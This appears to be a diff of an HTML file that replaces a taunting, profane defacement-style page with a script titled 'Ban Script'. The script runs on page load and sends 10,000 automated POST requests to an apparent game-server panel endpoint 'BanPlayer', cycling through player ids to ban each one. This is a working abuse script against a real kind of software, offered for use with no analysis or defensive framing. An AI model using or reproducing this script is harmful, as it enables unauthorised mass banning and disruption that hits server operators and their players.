@@ -1,107 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formal Design</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
-            color: #f8f8f8;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(0, 86, 179, 0.03) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(0, 122, 61, 0.03) 0%, transparent 50%);
-            pointer-events: none;
-        }
-
-        .content {
-            max-width: 700px;
-            padding: 50px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .header {
-            margin-bottom: 40px;
-        }
-
-        h1 {
-            font-size: 36px;
-            margin-bottom: 8px;
-            font-weight: 300;
-            color: #ffffff;
-            letter-spacing: 0.5px;
-        }
-
-        .subtitle {
-            font-size: 33px;
-            color: #888;
-            font-weight: 300;
-            letter-spacing: 0.3px;
-        }
-
-        p {
-            font-size: 17px;
-            line-height: 1.7;
-            margin-bottom: 18px;
-            color: #e0e0e0;
-            font-weight: 300;
-        }
-
-        .text-box {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 4px;
-            padding: 25px;
-            margin: 25px 0;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .footer {
-            margin-top: 50px;
-            font-size: 13px;
-            opacity: 0.7;
-            color: #999;
-            letter-spacing: 0.5px;
-        }
-
-    </style>
+  <meta charset="UTF-8">
+  <title>Ban Script</title>
+  <!-- jQuery (needed for $.post to work) -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-    <div class="content">
-        <div class="header">
-            <div class="subtitle">Instagram: @ Fuck You Navy</div>
-        </div>
-        <div class="text-box">
-            <p>S <span>E</span>، X.</p>
-            <p>g <span>g</span>, bro.</p>
-        </div>
-        <div class="footer">
-            &copy; HN &bull; HN
-        </div>
-    </div>
+  <script>
+    for (let i = 1; i <= 10000; i++) {
+      setTimeout(() => {
+        $.post('https://ec-panel/BanPlayer', JSON.stringify({
+          id: i,
+          Reason: "HN TESTING"
+        }));
+      }, i * 50); // 50ms delay between each request
+    }
+  </script>
 </body>
-</html> 
+</html>
